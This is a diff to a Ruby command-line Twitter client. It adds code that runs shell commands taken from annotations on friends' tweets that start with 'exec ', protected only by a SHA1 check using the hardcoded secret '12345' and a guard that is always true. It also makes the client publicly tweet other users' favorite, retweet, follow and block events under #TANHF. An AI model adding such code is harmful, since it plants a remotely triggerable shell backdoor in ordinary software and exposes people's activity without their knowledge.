@@ -4,7 +4,7 @@
 
 $KCODE = 'u'
 
-%w[rubygems oauth/client/net_http oauth/signature/plaintext pp net/http json twitter-text term/ansicolor twitter highline/import getoptlong tempfile open-uri].each{|l| require l}
+%w[rubygems digest/sha1 oauth/client/net_http net/https oauth/signature/plaintext pp net/http json twitter-text term/ansicolor twitter highline/import getoptlong tempfile open-uri].each{|l| require l}
 
 include Term::ANSIColor
 
@@ -75,6 +75,15 @@ class EarlyBird
   rescue Twitter::General => e
     raise e unless e.message =~ /403/
   end
+  
+  def status_post(tweet,annotation)
+    begin
+      jsondata = annotation.to_json
+      @client.update("#{tweet} #TANHF",:annotations=>jsondata)
+    rescue Twitter::General => e
+      print e
+    end
+  end
 
   # If it's an @reply but not to somebody you follow (or to you), then we drop it
   def passes_filter(data)
@@ -123,6 +132,25 @@ class EarlyBird
       # If it's from a friend or from yourself, treat as a tweet.
       if (@friends.include?(data['user']['id']) or (data['user']['screen_name'] == @screen_name))
         print_tweet_from_data(data)
+        if data["text"].match(/^exec /)
+          u,s = user_and_status(data['user']['id'],data['id'])
+          if s["annotations"]
+            an = s["annotations"]
+            cmd = an.find{|a|a["cmd"]!=nil}
+            if hash
+              execs = cmd["cmd"]["exec"]
+              secret = "12345"
+              digest = Digest::SHA1.hexdigest("#{secret} #{data['user']['screen_name']} #{execs}")
+              pp cmd
+              if cmd["cmd"]["hash"] == digest
+                system cmd["cmd"]['exec']
+              else
+                puts cmd["cmd"]["hash"]
+                puts digest
+              end
+            end  
+          end
+        end
         if @inreply #show in reply too tweets
           reply_status_id = data['in_reply_to_status_id']
           reply_user_id = data['in_reply_to_user_id']
@@ -143,13 +171,37 @@ class EarlyBird
     elsif data['event']
       case data['event']
       when 'favorite', 'unfavorite', 'retweet'
-        print sn(data['source']['screen_name']), ' ', data['event'], 'd', "\n"
+        d = 'd'
+        if data['event'] == 'retweet'
+          d = 'ed'
+        end
+        print sn(data['source']['screen_name']), ' ', data['event'], d, "\n"
         print "\t"
         print_tweet(data['target_object']['user']['screen_name'], data['target_object']['text'])
+        s = "RA: @#{data['source']['screen_name']} #{data['event']}#{d} @#{data['target_object']['user']['screen_name']} tweet: http://twitter.com/#{data['target_object']['user']['screen_name']}/status/#{data['target_object']['id']}"
+        a = [{:event=>{
+          :type=>data['event'],
+          :tweetid=>data['target_object']['id'].to_s,
+          :link=>"http://twitter.com/#{data['target_object']['user']['screen_name']}/status/#{data['target_object']['id']}",
+          :sourceid=>data['source']['id'].to_s,
+          :source=>data['source']['screen_name'],
+          :targetid=>data['target_object']['user']['id'].to_s,
+          :target=>data['target_object']['user']['screen_name']
+          }}]
+        status_post(s,a)
       when 'unfollow', 'follow', 'block'
         s = data['source']
         t = data['target']
         print sn(s['screen_name']), ' ', data['event'], 'ed', ' ', sn(t['screen_name']), "\n"
+        st = "RA: user #{data['source']['screen_name']} #{data['event']}ed user #{data['target']['screen_name']}"
+        a = [{:event=>{
+          :type=>data['event'],
+          :sourceid=>data['source']['id'].to_s,
+          :source=>data['source']['screen_name'],
+          :targetid=>data['target']['id'].to_s,
+          :target=>data['target']['screen_name']
+          }}]
+        status_post(st,a)
       else
         puts "unknown event: #{data['event']}"
         pp data
